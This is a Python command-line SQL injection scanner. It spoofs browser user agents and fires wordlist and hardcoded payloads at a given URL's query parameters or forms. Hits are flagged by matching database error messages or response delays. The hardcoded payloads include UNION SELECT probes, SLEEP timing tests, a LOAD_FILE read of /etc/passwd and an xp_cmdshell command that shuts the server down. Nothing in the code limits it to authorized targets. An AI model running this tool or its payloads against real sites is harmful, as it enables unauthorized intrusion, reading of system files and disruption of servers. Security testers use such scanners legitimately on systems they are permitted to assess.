import requests
import argparse
import random
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urljoin, quote
from statistics import mean
import os
import glob
import pyfiglet

class SQLScanner:
    def __init__(self, url, userAgent, sql_errors, method,cookie):
        self.url = url
        self.sql_errors = sql_errors
        self.method = method
        self.cookie = cookie
        self.headers = {
	        "User-Agent": userAgent if userAgent else random.choice([
		        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
	            ]),
	        "Referer": url.split('?')[0],
	        "Accept-Language": "en-US,en;q=0.9",
	        "Cookie": cookie
	    }


        self.union_payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL, NULL--",
            "' UNION SELECT NULL, NULL, NULL--",
            "' UNION SELECT 1,2,3--",
        ]
        self.oob_payloads = [
            "' OR 1=1--",
            "' OR SLEEP(5)--",
            "' UNION SELECT LOAD_FILE('/etc/passwd')--",
            "'; exec xp_cmdshell('shutdown -s')--"
        ]


    def load_payloads(self, payloads_path):
        if not payloads_path:
            print(f"[-] Payloads path not provided!")
            exit(1)

        payloads = []
        if os.path.isdir(payloads_path):
            txt_files = glob.glob(os.path.join(payloads_path, "*.txt"))
            if not txt_files:
                print(f"[-] No .txt files found in the directory: {payloads_path}")
                exit(1)
            print(f"[i] Loading payloads from {len(txt_files)} files in directory: {payloads_path}")
            for file in txt_files:
                try:
                    with open(file, "r") as f:
                        payloads.extend(line.strip() for line in f if line.strip())
                except Exception as e:
                    print(f"[-] Error reading file {file}: {e}")
        elif os.path.isfile(payloads_path):
            try:
                with open(payloads_path, "r") as file:
                    payloads = [line.strip() for line in file if line.strip()]
            except FileNotFoundError:
                print(f"[-] Payload file not found: {payloads_path}")
                exit(1)
        else:
            print(f"[-] Invalid payloads path: {payloads_path}")
            exit(1)

        if not payloads:
            print("[-] No payloads loaded. Please check your files.")
            exit(1)

        print(f"[+] Loaded {len(payloads)} payloads.")
        return payloads

        
    def extract_query_params(self):
        parsed_url = urlparse(self.url)
        return parsed_url.scheme, parsed_url.netloc, parsed_url.path, parse_qs(parsed_url.query)

    def test_query_params(self,payloads):
        scheme, netloc, path, query_params = self.extract_query_params()
        if not query_params:
            print(f"[+] No query parameters found in the URL: {self.url}")
            return False

        print(f"[i] Testing query parameters for SQL injection vulnerabilities... ")

        for param, values in query_params.items():
            for payload in payloads:
                encoded_payload = quote(payload)
                query_params[param] = encoded_payload
                modified_query = urlencode(query_params, doseq=True)
                full_url = f"{scheme}://{netloc}{path}?{modified_query}"

                try:
                    response = requests.get(full_url, headers=self.headers, timeout=5)
                    if response.status_code == 505:
                        print(f"[!] Internal Server Error after sending: {full_url}")
                        exit(1)         

                    if response.status_code == 404: 
                        print(f"[!] Page not found after sending: {full_url}")
                        exit(1)

                    if response.status_code == 403:
                        print(f"[!] Request has been refused by the server after sending: {full_url}")
                        exit(1)

                    if response.status_code == 502 or response.status_code == 503: 
                        print(f"[!] Website is unreachable or unavailable after sending: {full_url}")
                        exit(1)

                    if any(error in response.text for error in self.sql_errors) or response.status_code == 400:
                        print(f"[!] SQL Injection Vulnerability Found!")
                        print(f"    URL: {full_url}")
                        print(f"    Payload: {payload}")    
                        return True
                        exit(1)

                except requests.RequestException as e:
                    print(f"[-] Error making request: {e}")
        return False

    def extract_forms(self):
        try:
            response = requests.get(self.url, headers=self.headers, timeout=5)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, "html.parser")
            return soup.find_all("form")
        except requests.RequestException as e:
            print(f"[-] Error fetching URL: {e}")
            return []

    def test_forms(self,payloads):
        forms = self.extract_forms()
        if not forms:
            print(f"[+] No forms found on the page: {self.url}")
            return False

        print(f"[i] Testing forms for SQL injection vulnerabilities...")
        for form in forms:
            action = form.get("action") or self.url
            form_url = urljoin(self.url, action)
            method = form.get("method", "get").lower()  # Default to GET if not specified
            inputs = form.find_all("input")

            for payload in payloads:
                data = {inp.get("name"): payload for inp in inputs if inp.get("name")}

                try:
                    if method == "get":
                        response = requests.get(form_url, params=data, headers=self.headers, timeout=5)
                    elif method == "post":
                        response = requests.post(form_url, data=data, headers=self.headers, timeout=5)
                    else:
                        print(f"[!] Unsupported form method: {method}")
                        continue

                    if response.status_code in [400, 403, 404, 502, 503, 505]:
                        print(f"[!] HTTP Error {response.status_code} after sending: {form_url}")
                        continue

                    if any(error in response.text for error in self.sql_errors):
                        print(f"[!] SQL Injection Vulnerability Found!")
                        print(f"    Form URL: {form_url}")
                        print(f"    Payload: {payload}")
                        return True
                except requests.RequestException as e:
                    print(f"[-] Error submitting form: {e}")
        return False

    def test_timing_based_injection(self, payloads, baseline_requests=3, threshold_multiplier=3):
    
    	try:
        	baseline_times = []
        	for _ in range(baseline_requests):
            		response = requests.get(self.url, headers=self.headers, timeout=10)
            		baseline_times.append(response.elapsed.total_seconds())

        	baseline_avg = mean(baseline_times)
        	threshold_time = baseline_avg * threshold_multiplier
        	print(f"[i] Baseline response time: {baseline_avg:.2f}s, Threshold: {threshold_time:.2f}s")

        	for payload in payloads:
            		timing_payload = payload.replace("'", " AND SLEEP(5)-- ")  
            		encoded_payload = quote(timing_payload)
            		full_url = f"{self.url}?{encoded_payload}"

            		try:
                		response = requests.get(full_url, headers=self.headers, timeout=10)
                		elapsed_time = response.elapsed.total_seconds()

                		if elapsed_time > threshold_time:
                    			print(f"[!] Timing-Based SQL Injection Vulnerability Found!")
                    			print(f"    URL: {full_url}")
                    			print(f"    Response Time: {elapsed_time:.2f}s")
                    			return True
            		except requests.RequestException as e:
                		print(f"[-] Error during request to {full_url}: {e}")

        	print("[INFO] No timing-based SQL injection vulnerabilities detected.")
    	except requests.RequestException as e:
        	print(f"[-] Error testing timing-based injection: {e}")
    	return False

    def test_union_based_injection(self,payloads):
        parsed_url = urlparse(self.url)
        query_params = parse_qs(parsed_url.query)

        for param in query_params:
            for payload in payloads:
                modified_params = query_params.copy()
                modified_params[param] = payload
                modified_query = urlencode(modified_params, doseq=True)
                full_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{modified_query}"
                response = requests.get(full_url, headers=self.headers)
                if any(error in response.text for error in self.sql_errors):
                    print(f"[!] Possible UNION-based SQL Injection detected in parameter: {param} with payload: {payload}")
                    return True

    def test_oob_sql_injection(self,payloads):
        parsed_url = urlparse(self.url)
        query_params = parse_qs(parsed_url.query)

        for param in query_params:
            for payload in payloads:
                modified_params = query_params.copy()
                modified_params[param] = payload
                modified_query = urlencode(modified_params, doseq=True)
                full_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{modified_query}"
                response = requests.get(full_url, headers=self.headers)

                if any(error in response.text for error in self.sql_errors):
                    print(f"[!] Possible OOB SQL Injection detected in parameter: {param} with payload: {payload}")
                    return True

    def run(self):
       

        if self.method == "q":
            print(f"[+] Detecting Backend of the Website ")
            print(f"[i] Performing Generic Error Based Detection")
            query_vuln = self.test_query_params(self.load_payloads("../../data/wordlists/SQLinj/detect/Generic_ErrorBased.txt"))
            print(f"[i] Performing Generic SQLI injection ")
            query_vuln2 = self.test_query_params(self.load_payloads("../../data/wordlists/SQLinj/detect/Generic_SQLI.txt"))
            print(f"[i] Performing MSSQL injection ")
            msql = self.test_query_params(self.load_payloads("../../data/wordlists/SQLinj/detect/MSSQL/MSSQL.txt"))
            print(f"[i] Performing MSSQL blind injection ")
            msql2 = self.test_query_params(self.load_payloads("../../data/wordlists/SQLinj/detect/MSSQL/MSSQL_blind.txt"))
            msql3 = self.test_query_params(self.load_payloads("../../data/wordlists/SQLinj/payloads-sql-blind/MSSQL/payloads-sql-blind-MSSQL-INSERT.txt"))
            msql4 = self.test_query_params(self.load_payloads("../../data/wordlists/SQLinj/payloads-sql-blind/MSSQL/payloads-sql-blind-MSSQL-WHERE.txt"))
            print(f"[i] Performing MySQL injection ")
            mys = self.test_query_params(self.load_payloads("../../data/wordlists/SQLinj/detect/MySQL/MySQL.txt"))
            print(f"[i] Performing MySQL blind injection ")
            mys2 = self.test_query_params(self.load_payloads("../../data/wordlists/SQLinj/payloads-sql-blind/MySQL/payloads-sql-blind-MySQL-INSERT.txt"))
            mys3 = self.test_query_params(self.load_payloads("../../data/wordlists/SQLinj/payloads-sql-blind/MySQL/payloads-sql-blind-MySQL-ORDER_BY.txt"))
            mys4 = self.test_query_params(self.load_payloads("../../data/wordlists/SQLinj/payloads-sql-blind/MySQL/payloads-sql-blind-MySQL-WHERE.txt"))
            print(f"[i] Performing MySQL and MSSQL injection ")
            mysb = self.test_query_params(self.load_payloads("../../data/wordlists/SQLinj/detect/MySQL/MySQL_MSSQL.txt"))
            print(f"[i] Performing NoSQL injection ")
            nql = self.test_query_params(self.load_payloads("../../data/wordlists/SQLinj/detect/NoSQL/no-sql.txt"))
            print(f"[i] Performing Oracle injection ")
            orcl = self.test_query_params(self.load_payloads("../../data/wordlists/SQLinj/detect/Oracle/oracle.txt"))
            print(f"[i] Performing xPlatform injection ")
            xp = self.test_query_params(self.load_payloads("../../data/wordlists/SQLinj/detect/xPlatform/xplatform.txt"))
            print(f"[i] Performing Generic Time based injection ")
            t_t= self.test_timing_based_injection(self.load_payloads("../../data/wordlists/SQLinj/detect/Generic_TimeBased.txt"))
            print(f"[i] Performing Generic Union Select injection")
            t_u= self.test_union_based_injection(self.load_payloads("../../data/wordlists/SQLinj/detect/Generic_UnionSelect.txt"))
            print(f"[i] Performing Generic OOB SQL injection")
            t_o= self.test_oob_sql_injection(self.oob_payloads)
            
            if query_vuln or query_vuln2 or msql or msql2 or mys or mys2 or mys3 or mys4 or mysb or nql or orcl or xp or t_t or t_u or t_o :
                print(f"[!] Vulnerability found on: {self.url} \n")
                
            else:
                print(f"[-] No vulnerability found on: {self.url} \n")
        elif self.method == "f":
            print(f"[+] Detecting Backend of the website ")
            print(f"[i] Perfomring Generic Error Based Detection")
            form_vuln = self.test_forms(self.load_payloads("../../data/wordlists/SQLinj/detect/Generic_ErrorBased.txt"))
            print(f"[i] Performing Gnereic SQLI injection")
            form_vuln2 = self.test_forms(self.load_payloads("../../data/wordlists/SQLinj/detect/Generic_SQLI.txt"))
            print(f"[i] Performing MSSQL injection")
            form_vuln3 = self.test_forms(self.load_payloads("../../data/wordlists/SQLinj/detect/MSSQL/MSSQL.txt"))
            print(f"[i] Performing MSSQL blind injection")
            form_vuln4 = self.test_forms(self.load_payloads("../../data/wordlists/SQLinj/detect/MSSQL/MSSQL_blind.txt"))
            form_vuln4_1 = self.test_forms(self.load_payloads("../../data/wordlists/SQLinj/payloads-sql-blind/MSSQL/payloads-sql-blind-MSSQL-INSERT.txt"))
            form_vuln4_2 = self.test_forms(self.load_payloads("../../data/wordlists/SQLinj/payloads-sql-blind/MSSQL/payloads-sql-blind-MSSQL-WHERE.txt"))
            print(f"[i] Performing MySQL injection")
            form_vuln5 = self.test_forms(self.load_payloads("../../data/wordlists/SQLinj/detect/MySQL/MySQL.txt"))
            print(f"[i] Performing MySQL blind injection")
            form_vuln5_1 = self.test_forms(self.load_payloads("../../data/wordlists/SQLinj/payloads-sql-blind/MySQL/payloads-sql-blind-MySQL-INSERT.txt"))
            form_vuln5_2 = self.test_forms(self.load_payloads("../../data/wordlists/SQLinj/payloads-sql-blind/MySQL/payloads-sql-blind-MySQL-ORDER_BY.txt"))
            form_vuln5_3 = self.test_forms(self.load_payloads("../../data/wordlists/SQLinj/payloads-sql-blind/MySQL/payloads-sql-blind-MySQL-WHERE.txt"))
            print(f"[i] Performing MySQL and MSSQL injection ")
            form_vuln6 = self.test_forms(self.load_payloads("../../data/wordlists/SQLinj/detect/MySQL/MySQL_MSSQL.txt"))
            print(f"[i] Performing NoSQL injection")
            form_vuln7 = self.test_forms(self.load_payloads("../../data/wordlists/SQLinj/detect/NoSQL/no-sql.txt"))
            print(f"[i] Performing Oracle injection")
            form_vuln8 = self.test_forms(self.load_payloads("../../data/wordlists/SQLinj/detect/Oracle/oracle.txt"))
            print(f"[i] Performing xPlatform injection ")
            form_vuln9 = self.test_forms(self.load_payloads("../../data/wordlists/SQLinj/detect/xPlatform/xplatform.txt"))
            print(f"[i] Performing Generic Time Based injection")
            form_vuln10 = self.test_forms(self.load_payloads("../../data/wordlists/SQLinj/detect/Generic_TimeBased.txt"))
            print(f"[i] Performing Generic Union Select injection")
            form_vuln11 = self.test_forms(self.load_payloads("../../data/wordlists/SQLinj/detect/Generic_UnionSelect.txt"))
            print(f"[i] Performing Generic OOB SQL injection")
            form_vuln12 = self.test_forms(self.oob_payloads)

            if form_vuln or form_vuln2 or form_vuln3 or form_vuln4 or form_vuln5 or form_vuln6 or form_vuln7 or form_vuln8 or form_vuln9 or form_vuln10 or form_vuln11 or form_vuln4_1 or form_vuln4_2 or form_vuln5_1 or form_vuln5_2 or form_vuln5_3:

                print(f"[!] Vulnerability found on: {self.url}")
            else:
                print(f"[-] No vulnerability found on: {self.url}")
        else:
            print("[-] Invalid method. Use 'q' for query parameter testing or 'f' for form testing.")

class CustomHelpFormatter(argparse.HelpFormatter):
        def add_usage(self, usage, actions, groups, prefix=None):
            banner = pyfiglet.figlet_format("SQL injection",font="slant")              
            print(banner)
            super().add_usage(usage, actions, groups, prefix)

class CLI:

    @staticmethod
    def parse_arguments():
        parser = argparse.ArgumentParser(formatter_class = CustomHelpFormatter)
        parser.add_argument("-u", "--url", type=str, required=True, help="Target URL (e.g., http://example.com)")
        parser.add_argument("-m", "--method", type=str, required=True, help="Method: 'f' for form or 'q' for query parameter")
        parser.add_argument("-c","--cookie",type=str,help="-c \"PHPSESID: 234234\"")
        parser.add_argument("-a","--user-agent",type=str,help="-a \"Mozilla/5.0 blah blah blah \"")
        return parser.parse_args()


if __name__ == "__main__":
    try:
        sql_errors = [
            "SQL syntax", "mysql_fetch", "You have an error in your SQL syntax;",
            "Warning: mysql", "ORA-", "syntax error", "unclosed quotation mark"
        ]

        cli_args = CLI.parse_arguments()
        scanner = SQLScanner(cli_args.url, cli_args.user_agent, sql_errors, cli_args.method,cli_args.cookie)
        scanner.run()

    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user.")
    except Exception as e:
        print(f"[-] Error: {e}")
